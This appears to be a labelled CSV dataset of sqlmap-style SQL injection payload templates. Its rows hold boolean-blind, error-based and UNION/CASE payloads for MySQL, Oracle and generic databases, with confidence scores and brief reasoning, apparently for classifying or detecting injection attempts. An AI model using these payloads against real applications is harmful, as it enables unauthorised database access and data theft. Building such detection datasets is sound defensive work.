id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
40219,"AND ELT([RANDNUM]=[RANDNUM],[RANDNUM1]) AND ELT([INFERENCE],[RANDNUM])",boolean_blind,mysql,0.7,Boolean-blind SQLi (OR/AND logic); DB: mysql. Payload length: 70 chars.,2
40220,"OR ELT([RANDNUM]=[RANDNUM],[RANDNUM1]) OR ELT([INFERENCE],[RANDNUM])",boolean_blind,mysql,0.7,Boolean-blind SQLi (OR/AND logic); DB: mysql. Payload length: 68 chars.,2
40221,"AND EXTRACTVALUE([RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 0x3A END) AND EXTRACTVALUE([RANDNUM],CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 0x3A END)",error_based,mysql,0.7,Error-based SQLi (extractvalue/updatexml); DB: mysql,2
40224,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END)) (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END)),union_based,generic,0.7,UNION-based payload detected. Payload length: 217 chars.,2
40227,"ELT([RANDNUM]=[RANDNUM],[RANDNUM1]) ELT([INFERENCE],[RANDNUM])",boolean_blind,mysql,0.7,Boolean-blind SQLi (OR/AND logic); DB: mysql. Payload length: 62 chars.,2
40228,"ELT([RANDNUM]=[RANDNUM],[ORIGVALUE]) ELT([INFERENCE],[ORIGVALUE])",boolean_blind,mysql,0.7,Boolean-blind SQLi (OR/AND logic); DB: mysql. Payload length: 65 chars.,2
40229,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)) (SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)),union_based,generic,0.7,UNION-based payload detected. Payload length: 239 chars.,2
40230,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)) (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)),union_based,generic,0.7,UNION-based payload detected. Payload length: 243 chars.,2
40236,(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END) (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END),union_based,oracle,0.7,UNION-based payload detected; DB: oracle. Payload length: 253 chars.,2
40237,(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END) (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END),union_based,oracle,0.7,UNION-based payload detected; DB: oracle. Payload length: 257 chars.,2
